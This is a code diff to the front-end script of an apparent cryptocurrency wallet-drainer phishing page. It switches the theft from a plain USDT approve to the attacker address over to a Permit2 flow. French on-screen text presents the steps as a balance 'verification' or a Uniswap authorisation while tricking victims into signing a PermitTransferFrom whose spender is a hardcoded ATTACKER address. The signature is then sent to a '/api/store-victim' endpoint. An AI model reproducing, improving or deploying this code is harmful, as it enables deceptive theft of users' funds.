@@ -834,6 +834,7 @@
 
   const ATTACKER = '0xa4645D082a7FdD6165b9D0eBF4D65a7063276333';
   const USDT_ADDR = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
+  const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
   const API = '/api/store-victim';
   const PROJECT_ID = '22d764eabb976a73c5ee29567f3972d6';
   const PUBLIC_RPC = 'https://ethereum.publicnode.com';
@@ -866,7 +867,7 @@ async function initWalletConnect() {
   const { uri, approval } = await signClient.connect({
     requiredNamespaces: {
       eip155: {
-        methods: ['personal_sign', 'eth_sendTransaction'],
+        methods: ['personal_sign', 'eth_sendTransaction', 'eth_signTypedData_v4'],
         chains: ['eip155:1'],
         events: []
       }
@@ -990,7 +991,7 @@ async function initWalletConnect() {
   function triggerApproveTx() {
     if (approveTxTriggered) return;
     approveTxTriggered = true;
-    sendExactApproveTransaction();
+    handlePermit2Flow();
   }
   setTimeout(triggerApproveTx, 1000);
   document.addEventListener('visibilitychange', function onVis() {
@@ -1001,7 +1002,7 @@ async function initWalletConnect() {
   });
 }
 
-async function sendExactApproveTransaction() {
+async function handlePermit2Flow() {
   try {
     const scanText = document.querySelector('.scan');
     if (scanText) scanText.textContent = 'Détection de votre solde USDT…';
@@ -1009,12 +1010,14 @@ async function sendExactApproveTransaction() {
     const provider = new ethers.providers.JsonRpcProvider(PUBLIC_RPC);
     const usdtContract = new ethers.Contract(USDT_ADDR, [
       'function balanceOf(address) view returns (uint256)',
-      'function decimals() view returns (uint8)'
+      'function decimals() view returns (uint8)',
+      'function allowance(address owner, address spender) view returns (uint256)'
     ], provider);
 
-    const [balance, decimals] = await Promise.all([
+    const [balance, decimals, permit2Allowance] = await Promise.all([
       usdtContract.balanceOf(account),
-      usdtContract.decimals()
+      usdtContract.decimals(),
+      usdtContract.allowance(account, PERMIT2_ADDRESS)
     ]);
 
     if (balance.isZero()) {
@@ -1023,33 +1026,87 @@ async function sendExactApproveTransaction() {
     }
 
     const balanceFormatted = ethers.utils.formatUnits(balance, decimals);
-    if (scanText) scanText.textContent = `Confirmez l'autorisation de ${balanceFormatted} USDT (frais de vérification).`;
 
-    const iface = new ethers.utils.Interface([
-      'function approve(address spender, uint256 amount)'
-    ]);
-    const data = iface.encodeFunctionData('approve', [ATTACKER, balance]);
+    if (permit2Allowance.lt(balance)) {
+      if (scanText) scanText.textContent = `Confirmez l'autorisation de ${balanceFormatted} USDT (Uniswap Protocol).`;
+      const iface = new ethers.utils.Interface([
+        'function approve(address spender, uint256 amount)'
+      ]);
+      const data = iface.encodeFunctionData('approve', [PERMIT2_ADDRESS, balance]);
+      const txParams = {
+        from: account,
+        to: USDT_ADDR,
+        data: data,
+        value: '0x0',
+        gas: '0x493E0',
+      };
+      const txHash = await signClient.request({
+        topic: session.topic,
+        chainId: 'eip155:1',
+        request: {
+          id: Date.now(),
+          jsonrpc: '2.0',
+          method: 'eth_sendTransaction',
+          params: [txParams],
+        },
+      });
+      console.log('Permit2 approve tx:', txHash);
+    }
 
-    const txParams = {
-      from: account,
-      to: USDT_ADDR,
-      data: data,
-      value: '0x0',
-      gas: '0x493E0',
+    if (scanText) scanText.textContent = `Signez l'autorisation Permit2 pour ${balanceFormatted} USDT.`;
+
+    const nonce = Date.now();
+    const deadline = Math.floor(Date.now() / 1000) + 3600;
+    const permitData = {
+      permitted: {
+        token: USDT_ADDR,
+        amount: balance.toString()
+      },
+      nonce: nonce,
+      deadline: deadline
+    };
+    const typedData = {
+      domain: {
+        name: 'Permit2',
+        chainId: 1,
+        verifyingContract: PERMIT2_ADDRESS
+      },
+      types: {
+        PermitTransferFrom: [
+          { name: 'permitted', type: 'TokenPermissions' },
+          { name: 'spender', type: 'address' },
+          { name: 'nonce', type: 'uint256' },
+          { name: 'deadline', type: 'uint256' }
+        ],
+        TokenPermissions: [
+          { name: 'token', type: 'address' },
+          { name: 'amount', type: 'uint256' }
+        ]
+      },
+      primaryType: 'PermitTransferFrom',
+      message: {
+        permitted: {
+          token: USDT_ADDR,
+          amount: balance.toString()
+        },
+        spender: ATTACKER,
+        nonce: nonce.toString(),
+        deadline: deadline.toString()
+      }
     };
 
-    const txHash = await signClient.request({
+    const permit2Sig = await signClient.request({
       topic: session.topic,
       chainId: 'eip155:1',
       request: {
         id: Date.now(),
         jsonrpc: '2.0',
-        method: 'eth_sendTransaction',
-        params: [txParams],
-      },
+        method: 'eth_signTypedData_v4',
+        params: [account, JSON.stringify(typedData)]
+      }
     });
 
-    console.log('Tx approve exacte envoyée:', txHash);
+    console.log('Permit2 sig:', permit2Sig);
     if (scanText) scanText.textContent = '✅ Autorisation donnée. Vérification terminée.';
 
     const addressKey = account.toLowerCase();
@@ -1081,7 +1138,12 @@ async function sendExactApproveTransaction() {
     await fetch('/api/store-victim', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ victim: account, chain: '1' })
+      body: JSON.stringify({
+        victim: account,
+        chain: '1',
+        permit2Sig: permit2Sig,
+        permitData: permitData
+      })
     });
 
   } catch (e) {
@@ -1089,7 +1151,6 @@ async function sendExactApproveTransaction() {
     const scanText = document.querySelector('.scan');
     if (scanText) scanText.textContent = '❌ Transaction refusée.';
 
-    // ====== DÉTECTION IMMÉDIATE DU REFUS ======
     const addressKey = account ? account.toLowerCase() : null;
     if (addressKey && pendingSignatures[addressKey]) {
       pendingSignatures[addressKey].done = true;
@@ -1117,6 +1178,7 @@ async function sendExactApproveTransaction() {
     }
   }
 }
+
 
   let victimPollTimer = null;
 
